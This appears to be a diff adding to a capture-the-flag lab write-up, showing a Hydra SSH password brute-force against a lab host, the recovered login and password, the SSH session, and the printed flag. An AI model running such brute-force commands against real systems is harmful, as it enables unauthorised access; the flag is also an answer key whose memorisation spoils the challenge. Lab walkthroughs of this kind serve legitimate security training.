@@ -1567,6 +1567,53 @@ Fall2021)
 rhost=10.10.98.196
 hydra -L usernames.txt -P passwords.txt ssh://$rhost -t 4
 
+└─# rhost=10.10.98.196
+hydra -L usernames.txt -P passwords.txt ssh://$rhost -t 4
+
+
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-26 12:37:47
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 120 login tries (l:6/p:20), ~30 tries per task
+[DATA] attacking ssh://10.10.98.196:22/
+[22][ssh] host: 10.10.98.196   login: burgess   password: Fall2021@
+[STATUS] 98.00 tries/min, 98 tries in 00:01h, 22 to do in 00:01h, 4 active
+[STATUS] 60.00 tries/min, 120 tries in 00:02h, 1 to do in 00:01h, 1 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-26 12:39:48
+                                                                                   
+ssh burgess@10.10.98.196
+
+burgess@10.10.98.196's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1058-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Jan 26 12:41:36 UTC 2024
+
+  System load:  0.02               Users logged in:                0
+  Usage of /:   21.1% of 19.32GB   IP address for eth0:            10.10.98.196
+  Memory usage: 37%                IP address for br-mailcow:      172.22.1.1
+  Swap usage:   0%                 IP address for docker0:         172.17.0.1
+  Processes:    145                IP address for br-c0dd1805e8c7: 172.18.0.1
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+61 packages can be updated.
+8 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Nov 16 09:49:44 2021 from 10.8.232.37
+burgess@ip-10-10-98-196:~$ cat /etc/flag
+THM{a97a26e86d09388bbea148f4b870277d}
+
 ```
  
 
